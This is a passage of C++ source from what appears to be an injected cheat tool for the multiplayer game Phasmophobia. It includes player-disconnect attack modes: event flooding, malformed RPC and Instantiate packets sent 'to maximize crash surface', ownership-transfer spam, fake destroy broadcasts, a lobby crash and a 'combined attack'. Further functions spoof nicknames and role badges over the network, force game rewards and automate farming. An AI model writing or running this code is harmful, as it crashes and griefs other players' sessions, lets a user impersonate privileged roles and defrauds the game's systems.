        int sent = 0;
        for (int i = 0; i < 100; ++i) {
            if (SendEventLowLevel(peer, Phasmo::EVT_PROPERTIES_CHANGED, nullptr, reo, true))
                ++sent;
            SendEventLowLevel(peer, Phasmo::EVT_PROPERTIES_CHANGED, nullptr, reo, false);
        }

        // Also send other internal codes to maximize crash surface
        for (int i = 0; i < 30; ++i) {
            SendEventLowLevel(peer, 200, nullptr, reo, true);  // malformed RPC
            SendEventLowLevel(peer, 202, nullptr, reo, true);  // malformed Instantiate
        }

        FlushPeer(peer);
        Logger::WriteLine("[Phasmo] Corrupt: %d events (code 253/200/202) to actor %d", sent, actor);
    }

    // ─── Mode 4: Ownership Chaos ───
    static void DisconnectMode_OwnershipSpam(int actor)
    {
        void* localPlayer = nullptr;
        int localActor = 0;
        __try {
            localPlayer = Phasmo_Call<void*>(Phasmo::RVA_PN_GetLocalPlayer, nullptr);
            if (localPlayer && Phasmo_Safe(localPlayer, 0x20))
                localActor = *reinterpret_cast<int32_t*>(
                    reinterpret_cast<uint8_t*>(localPlayer) + Phasmo::PP_ACTOR_NUMBER);
        } __except (EXCEPTION_EXECUTE_HANDLER) {}

        if (localActor <= 0) {
            Logger::WriteLine("[Phasmo] OwnershipSpam: can't get local actor");
            return;
        }

        // ViewID format: actorNr * 1000 + offset (PUN convention)
        int baseViewId = actor * 1000;
        int count = 0;
        for (int vid = baseViewId + 1; vid < baseViewId + 30; ++vid) {
            for (int round = 0; round < 15; ++round) {
                __try { Phasmo_Call<void>(Phasmo::RVA_PN_TransferOwnership, vid, localActor, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
                __try { Phasmo_Call<void>(Phasmo::RVA_PN_TransferOwnership, vid, actor, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
                count += 2;
            }
        }

        __try { Phasmo_Call<void>(Phasmo::RVA_PN_SendAllOutgoingCommands, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}
        Logger::WriteLine("[Phasmo] Ownership spam: %d transfers for actor %d", count, actor);
    }

    // ─── Mode 5: Ghost (fake destroy) ───
    static void DisconnectMode_Ghost(int actor)
    {
        void* peer = GetPhotonPeer();
        if (!peer) {
            Logger::WriteLine("[Phasmo] Ghost: no peer");
            return;
        }

        // Broadcast destroy events to all other clients
        auto* reo = MakeREO_Others();
        if (!reo) return;

        Il2CppClass* intClass = Phasmo_GetSystemClass("Int32");
        int baseViewId = actor * 1000;
        int sent = 0;
        for (int vid = baseViewId + 1; vid < baseViewId + 20; ++vid) {
            Il2CppObject* boxed = intClass ? Phasmo_ValueBox(intClass, &vid) : nullptr;
            if (SendEventLowLevel(peer, 204, boxed, reo, true))
                ++sent;
        }

        // Also remove server-side instantiations
        __try { Phasmo_Call<void>(Phasmo::RVA_PN_OpRemoveFromServerInstantiations, actor, nullptr); } __except (EXCEPTION_EXECUTE_HANDLER) {}

        FlushPeer(peer);
        Logger::WriteLine("[Phasmo] Ghost: %d destroy events for actor %d", sent, actor);
    }

    // ─── Main dispatcher ───
    static void ApplyDisconnectPlayer()
    {
        if (!MORE_DisconnectPlayer)
            return;

        MORE_DisconnectPlayer = false; // one-shot

        __try {
            int mode = MORE_DisconnectMode;

            // Mode 2 (Lobby Crash) doesn't need a target
            if (mode == 2) {
                DisconnectMode_LobbyCrash();
                Webhook_LogCommand("Disconnect", "Lobby Crash executed");
                return;
            }

            if (MORE_DisconnectTarget <= 0) {
                Logger::WriteLine("[Phasmo] No target selected");
                return;
            }

            int actor = MORE_DisconnectTarget;

            // Validate actor exists in PlayerListOthers
            bool validated = false;
            __try {
                auto* arr = Phasmo_Call<Phasmo::Il2CppArray*>(
                    Phasmo::RVA_PN_GetPlayerListOthers, nullptr);
                if (arr && Phasmo_Safe(arr, 0x20)) {
                    void** items = reinterpret_cast<void**>(
                        reinterpret_cast<uint8_t*>(arr) + Phasmo::ARRAY_FIRST_ELEMENT);
                    const size_t remoteCount = (static_cast<size_t>(arr->max_length) < 16u)
                        ? static_cast<size_t>(arr->max_length)
                        : 16u;
                    for (size_t i = 0; i < remoteCount; ++i) {
                        void* pp = items[i];
                        if (!pp || !Phasmo_Safe(pp, 0x20)) continue;
                        int a = *reinterpret_cast<int32_t*>(
                            reinterpret_cast<uint8_t*>(pp) + Phasmo::PP_ACTOR_NUMBER);
                        if (a == actor) { validated = true; break; }
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {}

            // Fallback: maybe it was a slot index from older code path
            if (!validated && actor >= 0 && actor <= 3) {
                int resolved = ResolveActorNumber(actor);
                if (resolved > 0) actor = resolved;
            }

            if (actor <= 0) {
                Logger::WriteLine("[Phasmo] Invalid target actor %d", MORE_DisconnectTarget);
                return;
            }

            // Build webhook detail
            static const char* modeNames[] = {
                "Desync", "Flood", "Lobby Crash", "Corrupt",
                "Ownership", "Ghost", "Combined"
            };
            const char* modeName = (mode >= 0 && mode < 7) ? modeNames[mode] : "Unknown";

            Logger::WriteLine("[Phasmo] Executing %s on actor %d", modeName, actor);

            switch (mode) {
            case 0: DisconnectMode_Desync(actor);        break;
            case 1: DisconnectMode_Flood(actor);         break;
            case 3: DisconnectMode_Corrupt(actor);       break;
            case 4: DisconnectMode_OwnershipSpam(actor); break;
            case 5: DisconnectMode_Ghost(actor);         break;
            case 6: // COMBINED — everything at once
                DisconnectMode_Flood(actor);
                DisconnectMode_Desync(actor);
                DisconnectMode_Corrupt(actor);
                DisconnectMode_OwnershipSpam(actor);
                DisconnectMode_Ghost(actor);
                Logger::WriteLine("[Phasmo] Combined attack for actor %d", actor);
                break;
            }

            // Log to webhook
            char detail[128];
            sprintf_s(detail, "%s on actor #%d", modeName, actor);
            Webhook_LogCommand("Disconnect", detail);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            Logger::WriteLine("[Phasmo] Exception in ApplyDisconnectPlayer");
        }
    }

    // ══════════════════════════════════════════════════════
    //  MORE: ALWAYS PERFECT GAME
    // ══════════════════════════════════════════════════════
    static void ApplyAlwaysPerfectGame()
    {
        if (!MORE_AlwaysPerfectGame) return;

        __try {
            Phasmo::LevelValues* values = Phasmo_GetLevelValues();
            if (!values || !values->currentDifficulty)
                return;

            // Override the multiplier to ensure perfect game bonus
            values->currentDifficulty->overrideMultiplier =
                std::max(values->currentDifficulty->overrideMultiplier, 1.0f);

            // Force all evidence to be given (max evidence)
            values->currentDifficulty->evidenceGiven = 3;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static void ApplyCustomName()
    {
        static std::string s_lastAppliedName;

        const bool manualApply = MORE_ApplyCustomNameNow;
        MORE_ApplyCustomNameNow = false;

        if (!MORE_CustomName && !manualApply)
            return;

        std::string name = MORE_NameBuffer;
        if (name.empty())
            return;

        EnsureLocalPlayer();
        Phasmo::NetworkPlayerSpot* spot = GetLocalNetworkSpot();

        if (spot && Phasmo_Safe(spot, sizeof(Phasmo::NetworkPlayerSpot))) {
            const std::string currentSpotName = Phasmo_StringToUtf8(reinterpret_cast<Il2CppString*>(spot->accountName));
            const bool alreadyApplied = (!manualApply &&
                name == s_lastAppliedName &&
                !currentSpotName.empty() &&
                currentSpotName == name);
            if (alreadyApplied)
                return;
        } else if (!manualApply && name == s_lastAppliedName) {
            // In scenes where PlayerSpot is not ready yet, avoid spamming Photon setters every frame.
            return;
        }

        if (Il2CppString* newName = Phasmo_StringNew(name.c_str())) {
            bool pushedNetworked = false;
            if (TrySetPhotonNickNameRaw(newName))
                pushedNetworked = true;
            if (TrySetPhotonClientNickNameRaw(newName))
                pushedNetworked = true;
            if (TrySetPhotonPlayerNickNameRaw(TryGetPhotonLocalPlayerRaw(), newName))
                pushedNetworked = true;

            if (spot && Phasmo_Safe(spot, sizeof(Phasmo::NetworkPlayerSpot))) {
                spot->accountName = newName;
                if (spot->photonPlayer && Phasmo_Safe(spot->photonPlayer, Phasmo::PP_NICKNAME + sizeof(void*))) {
                    *reinterpret_cast<Il2CppString**>(
                        reinterpret_cast<uint8_t*>(spot->photonPlayer) + Phasmo::PP_NICKNAME) = newName;
                }
                RefreshLobbyProfilesForSpot(spot, true);
            } else {
                // Spot can be null during transitions; refresh visible lobby cards as a fallback.
                void* serverManager = FindServerManager();
                if (serverManager && Phasmo_Safe(serverManager, Phasmo::SM_MULTIPLAYER_PROFILES + sizeof(void*))) {
                    void* listPtr = *reinterpret_cast<void**>(
                        reinterpret_cast<uint8_t*>(serverManager) + Phasmo::SM_MULTIPLAYER_PROFILES);
                    if (listPtr && Phasmo_Safe(listPtr, 0x20)) {
                        Il2CppListPlayer* list = reinterpret_cast<Il2CppListPlayer*>(listPtr);
                        if (Phasmo_Safe(list, sizeof(Il2CppListPlayer)) && list->_items && list->_size > 0 && list->_size <= 32) {
                            const size_t arrayBytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(list->_size) * sizeof(void*);
                            if (Phasmo_Safe(list->_items, arrayBytes)) {
                                void** entries = reinterpret_cast<void**>(
                                    reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);
                                for (int32_t i = 0; i < list->_size; ++i) {
                                    void* profile = entries[i];
                                    if (!profile || !Phasmo_Safe(profile, Phasmo::PC_PLAYER_SPOT + sizeof(void*)))
                                        continue;
                TryMultiplayerProfileUpdateUi(profile, true);
                                }
                            }
                        }
                    }
                }
            }

            if (!pushedNetworked)
                Logger::WriteLine("[More] Custom name set locally only (Photon setters unavailable).");

            s_lastAppliedName = name;
            Logger::WriteLine("[More] Custom name applied: %s", name.c_str());
            PushNotification("Custom Name", name.c_str());
        }
    }

    static bool TrySetPhotonNickNameRaw(Il2CppString* newName)
    {
        __try {
            Phasmo_Call<void>(Phasmo::RVA_PN_SetNickName, newName, nullptr);
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    static void* TryGetPhotonLocalPlayerRaw()
    {
        __try {
            return Phasmo_Call<void*>(Phasmo::RVA_PN_GetLocalPlayer, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return nullptr;
        }
    }

    static bool TrySetPhotonPlayerNickNameRaw(void* localPhotonPlayer, Il2CppString* newName)
    {
        if (!localPhotonPlayer || !newName)
            return false;

        __try {
            if (Phasmo_Safe(localPhotonPlayer, Phasmo::PP_NICKNAME + sizeof(void*))) {
                *reinterpret_cast<Il2CppString**>(
                    reinterpret_cast<uint8_t*>(localPhotonPlayer) + Phasmo::PP_NICKNAME) = newName;
                Phasmo_Call<void>(Phasmo::RVA_PP_SetNickName, localPhotonPlayer, newName, nullptr);
                return true;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}

        return false;
    }

    static bool TrySetPhotonClientNickNameRaw(Il2CppString* newName)
    {
        if (!newName)
            return false;

        void* client = Phasmo_GetPhotonNetworkClient();
        if (!client)
            return false;

        __try {
            Phasmo_Call<void>(Phasmo::RVA_LBC_SetNickName, client, newName, nullptr);
            return true;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }
    }

    static void ApplyBadge()
    {
        static Phasmo::PlayerRoleType s_lastPersistentRole = Phasmo::PlayerRoleType::None;
        static bool s_persistentActive = false;

        const bool wantsLocal = MORE_SetBadge;
        const bool wantsMultiplayer = MORE_SetBadgeMultiplayer;
        const bool wantsNetworked = MORE_SetBadgeNetworked;
        const bool persistent = MORE_SetBadgeNetworkedPersistent;
        const bool persistentJustEnabled = persistent && !s_persistentActive;
        s_persistentActive = persistent;

        if (!wantsLocal && !wantsMultiplayer && !wantsNetworked && !persistent)
            return;

        __try {
            EnsureLocalPlayer();

            Phasmo::NetworkPlayerSpot* spot = GetLocalNetworkSpot();
            if (!spot || !Phasmo_Safe(spot, sizeof(Phasmo::NetworkPlayerSpot)))
                return;

            const Phasmo::PlayerRoleType role = BadgeFromIndex(MORE_BadgeIndex);
            const bool persistentNeedsApply =
                persistent && (persistentJustEnabled || s_lastPersistentRole != role || spot->role != role);

            const bool doLocal = wantsLocal || persistentNeedsApply;
            const bool doMultiplayer = wantsMultiplayer || persistentNeedsApply;
            const bool doNetworked = wantsNetworked || persistentNeedsApply;

            if (!doLocal && !doMultiplayer && !doNetworked)
                return;

            if (wantsLocal)
                MORE_SetBadge = false;
            if (wantsMultiplayer)
                MORE_SetBadgeMultiplayer = false;
            if (wantsNetworked)
                MORE_SetBadgeNetworked = false;

            spot->role = role;
            spot->hasReceivedPlayerInformation = true;

            if (spot->photonPlayer && Phasmo_Safe(spot->photonPlayer, Phasmo::PP_NICKNAME + sizeof(void*))) {
                // Keep the local photon snapshot warm so player card refresh has current data.
                auto* nickname = *reinterpret_cast<Il2CppString**>(
                    reinterpret_cast<uint8_t*>(spot->photonPlayer) + Phasmo::PP_NICKNAME);
                if (!nickname && spot->accountName) {
                    *reinterpret_cast<void**>(
                        reinterpret_cast<uint8_t*>(spot->photonPlayer) + Phasmo::PP_NICKNAME) = spot->accountName;
                }
            }

            RefreshLobbyProfilesForSpot(spot, wantsMultiplayer);

            if (doNetworked) {
                void* serverManager = FindServerManager();
                if (serverManager && Phasmo_Safe(serverManager, Phasmo::SM_MULTIPLAYER_PROFILES + sizeof(void*))) {
                    void* listPtr = *reinterpret_cast<void**>(
                        reinterpret_cast<uint8_t*>(serverManager) + Phasmo::SM_MULTIPLAYER_PROFILES);
                    if (listPtr && Phasmo_Safe(listPtr, 0x20)) {
                        Il2CppListPlayer* list = reinterpret_cast<Il2CppListPlayer*>(listPtr);
                        if (Phasmo_Safe(list, sizeof(Il2CppListPlayer)) && list->_items && list->_size > 0 && list->_size <= 32) {
                            const size_t arrayBytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(list->_size) * sizeof(void*);
                            if (Phasmo_Safe(list->_items, arrayBytes)) {
                                void** entries = reinterpret_cast<void**>(
                                    reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);

                                void* profile = nullptr;
                                for (int32_t i = 0; i < list->_size; ++i) {
                                    void* candidate = entries[i];
                                    if (!candidate || !Phasmo_Safe(candidate, Phasmo::PC_PLAYER_SPOT + sizeof(void*)))
                                        continue;
                                    void* candidateSpot = *reinterpret_cast<void**>(
                                        reinterpret_cast<uint8_t*>(candidate) + Phasmo::PC_PLAYER_SPOT);
                                    if (candidateSpot == spot) {
                                        profile = candidate;
                                        break;
                                    }
                                }

                                if (profile) {
                                    // MonoBehaviourPun.pvCache is the only field and is at 0x20 on the object (0x10 hdr + 0x10 base fields).
                                    void* pv = (Phasmo_Safe(profile, 0x28))
                                        ? *reinterpret_cast<void**>(reinterpret_cast<uint8_t*>(profile) + 0x20)
                                        : nullptr;

                                    if (!pv) {
                                        static void* photonViewTypeObject = nullptr;
                                        static bool resolved = false;
                                        if (!resolved) {
                                            if (Il2CppClass* klass = Phasmo_GetClass("Photon.Pun", "PhotonView", "PhotonUnityNetworking")) {
                                                if (Il2CppType* type = Phasmo_ClassGetType(klass))
                                                    photonViewTypeObject = Phasmo_TypeGetObject(type);
                                            }
                                            resolved = true;
                                        }

                                        if (photonViewTypeObject && Phasmo_Safe(profile, 0x20)) {
                                            __try {
                                                pv = Phasmo_Call<void*>(Phasmo::RVA_UnityEngine_Component_GetComponent_Type, profile, photonViewTypeObject);
                                            }
                                            __except (EXCEPTION_EXECUTE_HANDLER) { pv = nullptr; }
                                        }
                                    }

                                    if (pv && Phasmo_Safe(pv, 0x40)) {
                                        Il2CppString* methodName = Phasmo_StringNew("SetRoleNetworked");
                                        Phasmo::Il2CppArray* args = Phasmo_NewObjectArray(1);
                                        Il2CppObject* boxedRole = Phasmo_BoxInt32(static_cast<int32_t>(role));
                                        if (methodName && args && boxedRole && Phasmo_ArraySetObject(args, 0, boxedRole))
                                            Phasmo_Call<void>(Phasmo::RVA_PV_RPC, pv, methodName, Phasmo::RPC_ALL, args, nullptr);
                                    }
                                }
                            }
                        }
                    }
                }
            }

            // Only notify on manual set or first persistent apply, not on every re-apply.
            if (wantsLocal || wantsNetworked || persistentJustEnabled) {
                Logger::WriteLine("[More] Badge/role refreshed locally: %s", RoleName(role));
                PushNotification("Role / Badge", RoleName(role));
            }

            s_lastPersistentRole = role;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    static Phasmo::GhostOS* FindGhostOS()
    {
        static Phasmo::GhostOS* cached = nullptr;
        static DWORD lastScan = 0;

        if (cached && Phasmo_Safe(cached, sizeof(Phasmo::GhostOS)))
            return cached;

        DWORD now = GetTickCount();
        if (now - lastScan < 1000)
            return cached;

        lastScan = now;
        Phasmo::Il2CppArray* arr = Phasmo_FindObjectsOfTypeAll("", "GhostOS", "Assembly-CSharp");
        if (!arr || !Phasmo_Safe(arr, Phasmo::ARRAY_FIRST_ELEMENT + sizeof(void*)))
            return nullptr;

        int32_t count = arr->max_length;
        if (count <= 0)
            return nullptr;
        if (count > 32)
            count = 32;

        const size_t bytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(count) * sizeof(void*);
        if (!Phasmo_Safe(arr, bytes))
            return nullptr;

        for (int32_t i = 0; i < count; ++i) {
            void* obj = *reinterpret_cast<void**>(
                reinterpret_cast<uint8_t*>(arr) + Phasmo::ARRAY_FIRST_ELEMENT + i * sizeof(void*));
            if (!obj || !Phasmo_Safe(obj, sizeof(Phasmo::GhostOS)))
                continue;

            cached = reinterpret_cast<Phasmo::GhostOS*>(obj);
            break;
        }

        return cached;
    }

    static void* FindServerManager()
    {
        static void* cached = nullptr;
        static DWORD lastScan = 0;

        if (cached && Phasmo_Safe(cached, Phasmo::SM_MULTIPLAYER_PROFILES + sizeof(void*)))
            return cached;

        DWORD now = GetTickCount();
        if (now - lastScan < 1000)
            return cached;

        lastScan = now;
        Phasmo::Il2CppArray* arr = Phasmo_FindObjectsOfTypeAll("", "ServerManager", "Assembly-CSharp");
        if (!arr || !Phasmo_Safe(arr, Phasmo::ARRAY_FIRST_ELEMENT + sizeof(void*)))
            return nullptr;

        int32_t count = arr->max_length;
        if (count <= 0)
            return nullptr;
        if (count > 16)
            count = 16;

        const size_t bytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(count) * sizeof(void*);
        if (!Phasmo_Safe(arr, bytes))
            return nullptr;

        for (int32_t i = 0; i < count; ++i) {
            void* obj = *reinterpret_cast<void**>(
                reinterpret_cast<uint8_t*>(arr) + Phasmo::ARRAY_FIRST_ELEMENT + i * sizeof(void*));
            if (!obj || !Phasmo_Safe(obj, Phasmo::SM_MULTIPLAYER_PROFILES + sizeof(void*)))
                continue;

            cached = obj;
            break;
        }

        return cached;
    }

    static void RefreshLobbyProfilesForSpot(Phasmo::NetworkPlayerSpot* spot, bool refreshAllIfNoMatch)
    {
        if (!spot || !Phasmo_Safe(spot, sizeof(Phasmo::NetworkPlayerSpot)))
            return;

        void* serverManager = FindServerManager();
        if (!serverManager)
            return;

        void* listPtr = *reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(serverManager) + Phasmo::SM_MULTIPLAYER_PROFILES);
        if (!listPtr || !Phasmo_Safe(listPtr, 0x20))
            return;

        Il2CppListPlayer* list = reinterpret_cast<Il2CppListPlayer*>(listPtr);
        if (!Phasmo_Safe(list, sizeof(Il2CppListPlayer)) || !list->_items || list->_size <= 0 || list->_size > 32)
            return;

        const size_t arrayBytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(list->_size) * sizeof(void*);
        if (!Phasmo_Safe(list->_items, arrayBytes))
            return;

        void** entries = reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(list->_items) + Phasmo::ARRAY_FIRST_ELEMENT);

        bool matched = false;
        for (int32_t i = 0; i < list->_size; ++i) {
            void* profile = entries[i];
            if (!profile || !Phasmo_Safe(profile, Phasmo::PC_PLAYER_SPOT + sizeof(void*)))
                continue;

            void* profileSpot = *reinterpret_cast<void**>(
                reinterpret_cast<uint8_t*>(profile) + Phasmo::PC_PLAYER_SPOT);
            if (profileSpot != spot)
                continue;

            matched = true;
                    TryMultiplayerProfileUpdateUi(profile, true);
        }

        if (matched || !refreshAllIfNoMatch)
            return;

        for (int32_t i = 0; i < list->_size; ++i) {
            void* profile = entries[i];
            if (!profile || !Phasmo_Safe(profile, Phasmo::PC_PLAYER_SPOT + sizeof(void*)))
                continue;
                    TryMultiplayerProfileUpdateUi(profile, true);
        }
    }

    static void* FindLevelSelectionManager()
    {
        static void* cached = nullptr;
        static DWORD lastScan = 0;

        if (cached && Phasmo_Safe(cached, Phasmo::LSM_SELECTED_CONTRACT + sizeof(void*)))
            return cached;

        DWORD now = GetTickCount();
        if (now - lastScan < 1000)
            return cached;

        lastScan = now;
        Phasmo::Il2CppArray* arr = Phasmo_FindObjectsOfTypeAll("", "LevelSelectionManager", "Assembly-CSharp");
        if (!arr || !Phasmo_Safe(arr, Phasmo::ARRAY_FIRST_ELEMENT + sizeof(void*)))
            return nullptr;

        int32_t count = arr->max_length;
        if (count <= 0)
            return nullptr;
        if (count > 8)
            count = 8;

        const size_t bytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(count) * sizeof(void*);
        if (!Phasmo_Safe(arr, bytes))
            return nullptr;

        for (int32_t i = 0; i < count; ++i) {
            void* obj = *reinterpret_cast<void**>(
                reinterpret_cast<uint8_t*>(arr) + Phasmo::ARRAY_FIRST_ELEMENT + i * sizeof(void*));
            if (!obj || !Phasmo_Safe(obj, Phasmo::LSM_SELECTED_CONTRACT + sizeof(void*)))
                continue;

            cached = obj;
            break;
        }

        return cached;
    }

    static std::string GetCurrentPhotonRoomName()
    {
        void* room = TryGetCurrentPhotonRoomRaw();

        if (!room || !Phasmo_Safe(room, 0x20))
            return {};

        Il2CppString* roomName = TryGetPhotonRoomNameRaw(room);
        return roomName ? Phasmo_StringToUtf8(roomName) : std::string{};
    }

    static int GetCurrentPhotonRoomPlayerCount()
    {
        void* room = TryGetCurrentPhotonRoomRaw();

        if (!room || !Phasmo_Safe(room, 0x20))
            return -1;

        __try { return static_cast<int>(Phasmo_Call<uint8_t>(Phasmo::RVA_PR_GetPlayerCount, room, nullptr)); }
        __except (EXCEPTION_EXECUTE_HANDLER) { return -1; }
    }

    static bool IsLocalLobbySpotReady()
    {
        Phasmo::Network* network = Phasmo_GetNetwork();
        if (!network || !Phasmo_Safe(network, sizeof(Phasmo::Network)))
            return false;

        auto* spot = reinterpret_cast<Phasmo::NetworkPlayerSpot*>(network->localPlayer);
        if (!spot || !Phasmo_Safe(spot, sizeof(Phasmo::NetworkPlayerSpot)))
            return false;

        return spot->playerReady;
    }

    static bool SelectAutoFarmContract(void* serverManager)
    {
        void* levelSelectionManager = FindLevelSelectionManager();
        if (!levelSelectionManager || !Phasmo_Safe(levelSelectionManager, Phasmo::LSM_SELECTED_CONTRACT + sizeof(void*)))
            return false;

        void* contractsArray = *reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(levelSelectionManager) + Phasmo::LSM_CONTRACTS);
        auto* contracts = reinterpret_cast<Phasmo::Il2CppArray*>(contractsArray);
        if (!contracts || !Phasmo_Safe(contracts, Phasmo::ARRAY_FIRST_ELEMENT + sizeof(void*)))
            return false;

        int32_t count = contracts->max_length;
        if (count <= 0)
            return false;
        if (count > 32)
            count = 32;

        const size_t bytes = Phasmo::ARRAY_FIRST_ELEMENT + static_cast<size_t>(count) * sizeof(void*);
        if (!Phasmo_Safe(contracts, bytes))
            return false;

        void** entries = reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(contracts) + Phasmo::ARRAY_FIRST_ELEMENT);

        void* currentContract = *reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(levelSelectionManager) + Phasmo::LSM_SELECTED_CONTRACT);
        void* chosenContract = currentContract;

        if (!chosenContract || NETWORK_AutoFarmContractMode != 0 || NETWORK_AutoFarmRefreshContracts) {
            int chosenIndex = 0;
            switch (NETWORK_AutoFarmContractMode) {
            case 1: // Random
                chosenIndex = static_cast<int>(GetTickCount64() % static_cast<ULONGLONG>(count));
                break;
            case 2: // Rotate / deterministic next
                chosenIndex = static_cast<int>((GetTickCount64() / 1000ULL) % static_cast<ULONGLONG>(count));
                break;
            default: // Keep current / fallback first valid
                chosenIndex = 0;
                break;
            }

            if (!entries[chosenIndex]) {
                for (int32_t i = 0; i < count; ++i) {
                    if (entries[i]) {
                        chosenIndex = i;
                        break;
                    }
                }
            }

            chosenContract = entries[chosenIndex];
        }

        if (!chosenContract)
            return false;

        *reinterpret_cast<void**>(
            reinterpret_cast<uint8_t*>(levelSelectionManager) + Phasmo::LSM_SELECTED_CONTRACT) = chosenContract;

        if (serverManager && Phasmo_Safe(serverManager, Phasmo::SM_SELECTED_CONTRACT + sizeof(void*))) {
            *reinterpret_cast<void**>(
                reinterpret_cast<uint8_t*>(serverManager) + Phasmo::SM_SELECTED_CONTRACT) = chosenContract;
        }

        s_autoFarmSelectedContractThisLobby = true;
        return true;
    }

    static void TriggerAutoFarmRetry(const char* reason)
    {
        const ULONGLONG now = GetTickCount64();
        if ((now - s_autoFarmLastRetryAtMs) < 5000)
            return;

        s_autoFarmLastRetryAtMs = now;

        bool connected = false;
        __try { connected = Phasmo_Call<bool>(Phasmo::RVA_PN_IsConnected); }
        __except (EXCEPTION_EXECUTE_HANDLER) { connected = false; }

        bool inRoom = false;
        __try { inRoom = Phasmo_Call<bool>(Phasmo::RVA_PN_GetInRoom); }
        __except (EXCEPTION_EXECUTE_HANDLER) { inRoom = false; }

        if (connected && inRoom) {
            Logger::WriteLine("[AutoFarm] %s -> disconnect/retry", reason ? reason : "retry");
            PushNotification("AutoFarm Retry", reason ? reason : "retry");
            Webhook_LogCommand("AutoFarm Retry", reason ? reason : "retry");
            Phasmo_Call<bool>(Phasmo::RVA_PN_Disconnect, nullptr);
            return;
        }

        Logger::WriteLine("[AutoFarm] %s -> quick rejoin armed", reason ? reason : "retry");
        PushNotification("AutoFarm Rejoin", reason ? reason : "retry");
        Webhook_LogCommand("AutoFarm Rejoin", reason ? reason : "retry");
        NETWORK_QuickRejoin = true;
    }

    static void ApplyAutoFarm()
    {
        const bool enabled = NETWORK_AutoFarm;
        const ULONGLONG now = GetTickCount64();

        if (!enabled) {
            s_autoFarmLastEnabled = false;
            s_autoFarmLastInGame = false;
            s_autoFarmLastInRoom = false;
            s_autoFarmLobbyEnteredAtMs = 0;
            s_autoFarmRoundEnteredAtMs = 0;
            s_autoFarmLastRoundEndedAtMs = 0;
            s_autoFarmLastActionAtMs = 0;
            s_autoFarmSelectedContractThisLobby = false;
            s_autoFarmLastRoomName.clear();
            return;
        }

        bool connected = false;
        bool ready = false;
        bool inRoom = false;
        bool masterClient = false;
        TryGetPhotonStateRaw(connected, ready, inRoom, masterClient);

        const bool inGame = IsInGame();
        const std::string currentRoomName = inRoom ? GetCurrentPhotonRoomName() : std::string{};

        if (!s_autoFarmLastEnabled) {
            s_autoFarmLobbyEnteredAtMs = now;
            s_autoFarmRoundEnteredAtMs = 0;
            s_autoFarmLastRoundEndedAtMs = 0;
            s_autoFarmLastActionAtMs = 0;
            s_autoFarmLastRetryAtMs = 0;
            s_autoFarmSelectedContractThisLobby = false;
            s_autoFarmLastRoomName = currentRoomName;
            Logger::WriteLine("[AutoFarm] Enabled");
            PushNotification("AutoFarm", "Enabled");
        }

        if (inRoom && (!s_autoFarmLastInRoom || currentRoomName != s_autoFarmLastRoomName)) {
            s_autoFarmLobbyEnteredAtMs = now;
            s_autoFarmSelectedContractThisLobby = false;
            s_autoFarmLastRoomName = currentRoomName;
        }

        if (inGame && !s_autoFarmLastInGame) {
            s_autoFarmRoundEnteredAtMs = now;
            s_autoFarmLastActionAtMs = 0;
            Logger::WriteLine("[AutoFarm] Round started");
        }

        if (!inGame && s_autoFarmLastInGame) {
            s_autoFarmLastRoundEndedAtMs = now;
            s_autoFarmLobbyEnteredAtMs = now;
            s_autoFarmRoundEnteredAtMs = 0;
            s_autoFarmSelectedContractThisLobby = false;
            Logger::WriteLine("[AutoFarm] Round ended");
        }

        if (!inRoom) {
            if (NETWORK_AutoFarmAutoRerun && s_autoFarmLastRoundEndedAtMs != 0 &&
                (now - s_autoFarmLastRoundEndedAtMs) >= static_cast<ULONGLONG>(std::max(1, NETWORK_AutoFarmEndDelaySec)) * 1000ULL) {
                TriggerAutoFarmRetry("post-round rerun");
            }

            s_autoFarmLastEnabled = true;
            s_autoFarmLastInGame = inGame;
            s_autoFarmLastInRoom = inRoom;
            return;
        }

        if (!inGame) {
            void* serverManager = FindServerManager();
            if (!s_autoFarmSelectedContractThisLobby)
                SelectAutoFarmContract(serverManager);

            const int playerCount = GetCurrentPhotonRoomPlayerCount();
            const int minPlayers = std::max(1, NETWORK_AutoFarmMinPlayers);
            const bool minPlayersOk = !NETWORK_AutoFarmUseMinPlayers || playerCount < 0 || playerCount >= minPlayers;

            const ULONGLONG lobbyElapsedMs = (s_autoFarmLobbyEnteredAtMs > 0) ? (now - s_autoFarmLobbyEnteredAtMs) : 0;
            const ULONGLONG startDelayMs = static_cast<ULONGLONG>(std::max(0, NETWORK_AutoFarmStartDelaySec)) * 1000ULL;
            const ULONGLONG lobbyTimeoutMs = static_cast<ULONGLONG>(std::max(5, NETWORK_AutoFarmLobbyTimeoutSec)) * 1000ULL;

            if (minPlayersOk && lobbyElapsedMs >= startDelayMs && serverManager) {
                if ((now - s_autoFarmLastActionAtMs) >= 1000ULL && !IsLocalLobbySpotReady()) {
                    Phasmo_Call<void>(Phasmo::RVA_ServerManager_Ready, serverManager, true);
                    s_autoFarmLastActionAtMs = now;
                    Logger::WriteLine("[AutoFarm] Ready sent");
                    PushNotification("AutoFarm", "Sent ready state");
                } else if (masterClient && (now - s_autoFarmLastActionAtMs) >= 2000ULL) {
